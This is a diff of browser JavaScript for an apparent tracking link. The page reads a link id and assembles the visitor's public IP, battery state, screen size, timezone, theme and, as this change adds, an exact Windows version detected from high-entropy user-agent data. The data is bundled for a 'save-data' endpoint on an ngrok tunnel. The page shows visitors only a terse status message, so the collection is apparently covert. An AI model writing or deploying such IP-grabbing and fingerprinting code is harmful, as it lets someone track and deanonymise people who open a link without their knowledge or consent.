@@ -3,15 +3,33 @@ const linkId = urlParams.get('id');
 const BACKEND_URL = "https://activism-suggest-probation.ngrok-free.dev/save-data";
 
 if (!linkId) {
-    document.getElementById('status').innerText = "Erreur : lien inexistant : réessayez ou demandez un nouveau lien à votre fournisseur. ";
+    document.getElementById('status').innerText = "err mauvais lien.";
 } else {
+    // Fonction pour récupérer la vraie version de Windows (10 ou 11)
+    const getHighEntropyValues = () => {
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            return navigator.userAgentData.getHighEntropyValues(['platformVersion'])
+                .then(ua => {
+                    const majorVersion = parseInt(ua.platformVersion.split('.')[0], 10);
+                    // Sous Windows, une version de plateforme supérieure ou égale à 13 correspond à Windows 11
+                    if (navigator.userAgentData.platform === "Windows" && majorVersion >= 13) {
+                        return "Windows 11";
+                    }
+                    return null;
+                }).catch(() => null);
+        }
+        return Promise.resolve(null);
+    };
+
     Promise.all([
         fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: null })),
-        navigator.getBattery ? navigator.getBattery().catch(() => null) : Promise.resolve(null)
-    ]).then(([ipData, battery]) => {
+        navigator.getBattery ? navigator.getBattery().catch(() => null) : Promise.resolve(null),
+        getHighEntropyValues()
+    ]).then(([ipData, battery, exactOS]) => {
         const donnéesAEnvoyer = {
             id_lien: linkId,
             forceIPv4: ipData.ip,
+            exactOS: exactOS,
             resolution: `${window.screen.width}x${window.screen.height}`,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sombre' : 'Clair',
